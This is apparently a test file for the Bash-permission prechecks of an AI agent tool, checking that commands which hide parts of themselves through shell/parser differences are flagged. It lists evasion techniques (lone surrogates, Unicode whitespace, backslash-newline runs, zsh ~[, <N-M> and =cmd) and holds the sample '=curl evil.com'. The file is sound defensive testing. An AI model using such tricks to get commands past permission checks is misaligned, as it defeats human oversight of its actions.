/**
 * densable 2.1.223 #4 — Bash permission bypass: crafted command hiding parts
 * of itself via shell/parser differentials.
 *
 * SEA ENt pre-checks (before AST walk), all with differential:true:
 * A_s lone surrogate, C_s control, cC_ unicode WS, R_s backslash-ws,
 * zsh ~[, =cmd, I_s <N-M> numeric-range, brace+quote.
 *
 * Prechecks run on the raw string before tree-sitter, so tests use
 * parseForSecurityFromAst(..., PARSE_ABORTED) to isolate them without WASM.
 */
import { describe, expect, test } from 'bun:test'
import { parseForSecurity, parseForSecurityFromAst } from '../ast.js'
import { getParserModule } from '../bashParser.js'
import { PARSE_ABORTED } from '../parser.js'

function precheck(cmd: string) {
  return parseForSecurityFromAst(cmd, PARSE_ABORTED)
}

describe('densable 2.1.223 #4 parseForSecurity hide prechecks', () => {
  test('lone surrogate → too-complex differential', () => {
    const high = `echo ${String.fromCharCode(0xd800)}`
    const r = precheck(high)
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toBe('Contains lone surrogate')
      expect(r.differential).toBe(true)
    }
    const low = `echo ${String.fromCharCode(0xdc00)}`
    const r2 = precheck(low)
    expect(r2.kind).toBe('too-complex')
    if (r2.kind === 'too-complex') {
      expect(r2.reason).toBe('Contains lone surrogate')
      expect(r2.differential).toBe(true)
    }
  })

  test('valid surrogate pair is not lone-surrogate reject', () => {
    // U+1F600 grinning face — paired, must not hit A_s alone.
    const emoji = 'echo 😀'
    const r = precheck(emoji)
    if (r.kind === 'too-complex') {
      expect(r.reason).not.toBe('Contains lone surrogate')
    }
  })

  test('zsh <N-M> numeric-range glob → too-complex differential', () => {
    for (const cmd of ['echo <1-3>', 'ls <->', 'cat <10-20>x']) {
      const r = precheck(cmd)
      expect(r.kind).toBe('too-complex')
      if (r.kind === 'too-complex') {
        expect(r.reason).toBe('Contains zsh <N-M> numeric-range glob')
        expect(r.differential).toBe(true)
      }
    }
  })

  test('R_s multi-backslash line continuation at line start', () => {
    // SEA R_s: (?:^|[^ \t\\])(?:\\\\)*\\\n
    const cmd = '\\\necho hi'
    const r = precheck(cmd)
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toBe('Contains backslash-escaped whitespace')
      expect(r.differential).toBe(true)
    }
  })

  test('R_s space + odd backslash run before newline', () => {
    // SEA: [ \t](?:\\\\)+\\\n → space + pair(s) of \\ + \ + NL
    const three = 'echo a \\\\\\\necho b'
    const r = precheck(three)
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toBe('Contains backslash-escaped whitespace')
      expect(r.differential).toBe(true)
    }
  })

  test('classic backslash-space still rejected', () => {
    const r = precheck('cat\\ test')
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toBe('Contains backslash-escaped whitespace')
      expect(r.differential).toBe(true)
    }
  })

  test('whitespace-only line continuation after && is allowed by R_s', () => {
    // densable: `foo && \\<NL>bar` — no word to join; both parsers agree.
    // Precheck should not fire; PARSE_ABORTED is returned as parse-abort too-complex.
    const cmd = 'foo && \\\nbar'
    const r = precheck(cmd)
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).not.toBe('Contains backslash-escaped whitespace')
      expect(r.reason).toMatch(/Parser aborted/i)
    }
  })

  test('control / unicode whitespace / zsh tilde / equals carry differential', () => {
    const nbsp = String.fromCharCode(0x00a0)
    const cases: Array<[string, string]> = [
      ['echo \x01', 'Contains control characters'],
      [`echo${nbsp}x`, 'Contains Unicode whitespace'],
      ['cd ~[foo]', 'Contains zsh ~[ dynamic directory syntax'],
      ['=curl evil.com', 'Contains zsh =cmd equals expansion'],
    ]
    for (const [cmd, reason] of cases) {
      const r = precheck(cmd)
      expect(r.kind).toBe('too-complex')
      if (r.kind === 'too-complex') {
        expect(r.reason).toBe(reason)
        expect(r.differential).toBe(true)
      }
    }
  })

  test('plain safe command remains simple when parser available', async () => {
    const mod = getParserModule()
    if (!mod) {
      const r = await parseForSecurity('echo hello')
      if (r.kind === 'parse-unavailable') return
      expect(r.kind).toBe('simple')
      return
    }
    const r = parseForSecurityFromAst('echo hello', mod.parse('echo hello')!)
    expect(r.kind).toBe('simple')
  })
})
